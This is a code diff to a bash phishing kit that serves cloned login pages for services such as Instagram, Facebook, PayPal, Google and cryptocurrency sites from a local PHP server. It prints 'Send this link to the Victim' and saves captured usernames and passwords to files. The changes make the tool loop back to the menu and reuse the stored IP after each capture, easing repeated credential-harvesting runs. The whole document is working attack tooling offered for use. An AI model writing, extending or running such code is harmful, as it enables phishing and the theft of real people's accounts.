@@ -13,6 +13,9 @@
 
 trap 'printf "\n";stop;exit 1' 2
 
+option=0
+flag=0
+ip_global=""
 
 dependencies() {
 
@@ -43,72 +46,79 @@ printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      
 printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m           \e[1;94m CODED BY:  @thelinuxchoice\e[0m\n"
 
 printf "                                                \e[1;94m UPGRADED BY: @suljot_gjoka\e[0m\n"
+
+if [[ $flag == 0 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
+else
+option=$1
+
+fi
 
 if [[ $option == 1 ]]; then
 server="instagram"
-start
+start $ip_global
 
 elif [[ $option == 2 ]]; then
 server="facebook"
-start
+start $ip_global
 elif [[ $option == 3 ]]; then
 server="snapchat"
-start
+start $ip_global
 elif [[ $option == 4 ]]; then
 server="twitter"
-start
+start $ip_global
 elif [[ $option == 5 ]]; then
 server="github"
-start
+start $ip_global
+
 elif [[ $option == 6 ]]; then
 server="google"
-start
+start $ip_global
 
 elif [[ $option == 7 ]]; then
 server="spotify"
-start
+start $ip_global
 
 elif [[ $option == 8 ]]; then
 server="netflix"
-start
+start $ip_global
 
 elif [[ $option == 9 ]]; then
 server="paypal"
-start
+start $ip_global
 
 elif [[ $option == 10 ]]; then
 server="origin"
-start
+start $ip_global
 
 elif [[ $option == 11 ]]; then
 server="steam"
-start
+start $ip_global
 
 elif [[ $option == 12 ]]; then
 server="yahoo"
-start
+start $ip_global
 
 elif [[ $option == 13 ]]; then
 server="linkedin"
-start
+start $ip_global
 
 elif [[ $option == 14 ]]; then
 server="protonmail"
-start
+start $ip_global
 
 elif [[ $option == 15 ]]; then
 server="wordpress"
-start
+start $ip_global
 
 elif [[ $option == 16 ]]; then
 server="microsoft"
-start
+start $ip_global
 
 elif [[ $option == 17 ]]; then
 server="instafollowers"
-start
+start $ip_global
 
 elif [[ $option == 18 ]]; then
 server="shopping"
@@ -116,64 +126,64 @@ start
 
 elif [[ $option == 19 ]]; then
 server="pinterest"
-start
+start $ip_global
 
 elif [[ $option == 20 ]]; then
 server="cryptocurrency"
-start
+start $ip_global
 
 elif [[ $option == 21 ]]; then
 server="verizon"
-start
+start $ip_global
 
 elif [[ $option == 22 ]]; then
 server="dropbox"
-start
+start $ip_global
 
 elif [[ $option == 23 ]]; then
 server="adobe"
-start
+start $ip_global
 
 elif [[ $option == 24 ]]; then
 server="shopify"
-start
+start $ip_global
 
 elif [[ $option == 25 ]]; then
 server="messenger"
-start
+start $ip_global
 
 elif [[ $option == 26 ]]; then
 server="gitlab"
-start
+start $ip_global
 
 elif [[ $option == 27 ]]; then
 server="twitch"
-start
+start $ip_global
 
 elif [[ $option == 28 ]]; then
 server="myspace"
-start
+start $ip_global
 
 elif [[ $option == 29 ]]; then
 server="badoo"
-start
+start $ip_global
 
 elif [[ $option == 30 ]]; then
 server="vk"
-start
+start $ip_global
 
 elif [[ $option == 31 ]]; then
 server="yandex"
-start
+start $ip_global
 
 elif [[ $option == 32 ]]; then
 server="devianart"
-start
+start $ip_global
 
 elif [[ $option == 33 ]]; then
 server="create"
 createpage
-start
+start $ip_global
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -260,8 +270,8 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
-
-exit 1
+printf "\n\nOption Selected: $option\n\n\n"
+menu $option
 
 }
 
@@ -376,23 +386,35 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-default_ip=$(hostname -I)
+default_ip=$(hostname -i)
 printf "\e[1;92m[\e[0m*\e[1;92m] Put your local IP (Default %s): " $default_ip
-read ip
-ip="${ip:-${default_ip}}"
+
+if [[ $flag == 0 ]]; then
+read ip_global
+flag=1
+ip="${ip_global:-${default_ip}}"
+ip_global="${ip_global:-${default_ip}}"
+
+
+else
+	ip=$1
+fi
+
 if [ -d /data/data/com.termux/files/usr ]
-then 
-	printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-	php -t "sites/$server" -S "$ip:8080" > /dev/null 2>&1 & 
-	sleep 2
-	printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
-else 
+then
     printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-    php -t "sites/$server" -S "$ip:80" > /dev/null 2>&1 &
+    php -t "sites/$server" -S "$ip_global:8080" > /dev/null 2>&1 &
     sleep 2
-    printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
+    printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip:8080
+
+else
+    printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+    sudo php -t "sites/$server" -S "$ip_global:80" > /dev/null 2>&1 &
+    sleep 2
+    printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip:80
 
 fi
+
 checkfound
 }
 checkfound() {
